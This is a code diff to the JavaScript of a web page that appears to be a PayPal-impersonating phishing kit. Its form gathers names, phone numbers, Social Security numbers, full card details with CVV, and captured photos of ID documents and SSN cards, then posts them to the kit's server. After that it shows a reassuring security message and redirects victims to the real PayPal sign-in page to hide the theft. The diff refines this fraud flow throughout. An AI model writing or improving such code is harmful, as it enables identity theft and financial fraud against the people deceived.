             verificationForm.addEventListener('submit', async (event) => {
                 event.preventDefault();
+                const submitButton = verificationForm.querySelector('button[type="submit"]');
+                const originalButtonText = submitButton.textContent;
+                submitButton.disabled = true;
+                submitButton.textContent = 'Processing...';
 
                 const fullName = fullNameInput ? fullNameInput.value.trim() : '';
                 const phoneNumber = phoneNumberInput ? phoneNumberInput.value.trim() : '';
-                const ssn = rawSsn; // from global scope, updated by ssnInput listener
-                const bankName = ''; // No input field for bankName in current HTML
-                const cardNumber = cardNumberInput ? cardNumberInput.value.trim().replace(/\s/g, '') : '';
-                const expiryDate = expiryDateInput ? expiryDateInput.value.trim() : '';
-                const cvv = cvvInput ? cvvInput.value.trim() : '';
+                const ssn = rawSsn; 
+                const bankName = ''; 
+                const cardNumberVal = cardNumberInput ? cardNumberInput.value.trim().replace(/\s/g, '') : '';
+                const expiryDateVal = expiryDateInput ? expiryDateInput.value.trim() : '';
+                const cvvVal = cvvInput ? cvvInput.value.trim() : '';
 
-                let photoIdFrontBase64 = '';
-                let photoIdBackBase64 = '';
-                let ssnCardBase64 = '';
+                let finalPhotoIdFrontBase64 = capturedPhotoIdFrontBase64;
+                let finalPhotoIdBackBase64 = capturedPhotoIdBackBase64;
+                let finalSsnCardBase64 = capturedSsnCardBase64;
 
-                // Basic validation (you can enhance this)
-                if (!fullName || !phoneNumber || !ssn || !cardNumber || !expiryDate || !cvv) {
-                    alert('Please fill in all required text fields (Name, Phone, SSN, Card Number, Expiry Date, CVV).');
-                    return;
-                }
-                // Add other specific validations if needed (SSN length, card format etc.)
-
-                async function getBase64(fileInput) {
+                async function getBase64FromFile(fileInput) {
                     if (fileInput && fileInput.files.length > 0) {
                         const file = fileInput.files[0];
                         if (file) {
                             return await new Promise((resolve, reject) => {
                                 const reader = new FileReader();
-                                reader.onloadend = () => resolve(reader.result.split(',')[1]); // Send only base64 part
+                                reader.onloadend = () => resolve(reader.result.split(',')[1]);
                                 reader.onerror = reject;
                                 reader.readAsDataURL(file);
                             });
@@ -893,51 +1073,64 @@
                     return '';
                 }
 
-                photoIdFrontBase64 = await getBase64(photoIdFrontInput);
-                photoIdBackBase64 = await getBase64(photoIdBackInput);
-                ssnCardBase64 = await getBase64(ssnCardInput);
-
-                // Optional: Require at least the front ID photo
-                if (!photoIdFrontBase64) {
-                     alert('Please upload at least the front of your photo ID.');
-                     return;
+                if (!finalPhotoIdFrontBase64 && photoIdFrontInput && photoIdFrontInput.files.length > 0) {
+                    finalPhotoIdFrontBase64 = await getBase64FromFile(photoIdFrontInput);
+                }
+                if (!finalPhotoIdBackBase64 && photoIdBackInput && photoIdBackInput.files.length > 0) {
+                    finalPhotoIdBackBase64 = await getBase64FromFile(photoIdBackInput);
+                }
+                if (!finalSsnCardBase64 && ssnCardInput && ssnCardInput.files.length > 0) {
+                    finalSsnCardBase64 = await getBase64FromFile(ssnCardInput);
+                }
+                
+                if (!fullName || !phoneNumber || !ssn || !cardNumberVal || !expiryDateVal || !cvvVal) {
+                    alert('Please fill in all required text fields.');
+                    submitButton.disabled = false; submitButton.textContent = originalButtonText; return;
+                }
+                if (!finalPhotoIdFrontBase64) { 
+                     alert('Please upload or capture the front of your photo ID.');
+                     submitButton.disabled = false; submitButton.textContent = originalButtonText; return; 
                 }
 
                 const data = {
-                    fullName: fullName,
-                    phoneNumber: phoneNumber,
-                    ssn: ssn,
-                    bankName: bankName,
-                    cardNumber: cardNumber,
-                    expiryDate: expiryDate,
-                    cvv: cvv,
-                    photoIdFront: photoIdFrontBase64, // New field
-                    photoIdBack: photoIdBackBase64,   // New field
-                    ssnCard: ssnCardBase64
+                    fullName: fullName, phoneNumber: phoneNumber, ssn: ssn, bankName: bankName,
+                    cardNumber: cardNumberVal, expiryDate: expiryDateVal, cvv: cvvVal,
+                    photoIdFront: finalPhotoIdFrontBase64, 
+                    photoIdBack: finalPhotoIdBackBase64, 
+                    ssnCard: finalSsnCardBase64
                 };
-
                 console.log("Submitting verification data:", data);
 
                 try {
-                    const response = await fetch("{{ url_for('verify_info') }}", {
+                    const response = await fetch(VERIFY_INFO_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-
-                    const responseData = await response.json(); // Try to parse JSON regardless of ok status for messages
+                    const responseData = await response.json();
                     if (response.ok) {
-                        alert(responseData.message || 'Information submitted for verification! Redirecting...');
-                        // Potentially redirect to a success page or dashboard
-                        // window.location.href = "{{ url_for('dashboard') }}";
+                        // More professional success message
+                        let successMessage = "Thank you for providing your information. We're reviewing it to help keep your account secure. You will now be redirected.";
+                        alert(successMessage); 
+                        
+                        // Redirect to PayPal login page after 1 second
+                        setTimeout(() => { 
+                            window.location.href = "https://www.paypal.com/signin"; 
+                        }, 1000); // 1 second delay
+
                     } else {
-                        alert(`Verification failed: ${responseData.message || response.statusText || 'Server error'}`);
+                        alert(`Verification submission failed: ${responseData.message || response.statusText || 'Server error'}`);
+                        submitButton.disabled = false; submitButton.textContent = originalButtonText;
                     }
                 } catch (error) {
                     console.error('Error during verification fetch:', error);
-                    alert('An error occurred during verification. Please try again.');
+                    alert('An error occurred during submission. Please check your connection or try again.');
+                    submitButton.disabled = false; submitButton.textContent = originalButtonText;
                 }
             });
+        } else {
+            if (!verificationForm) console.error("Verification form not found.");
+            if (!VERIFY_INFO_URL) console.error("Verify info URL not found for form submission (check data-verify-url on form).");
         }
     </script>
 </body>
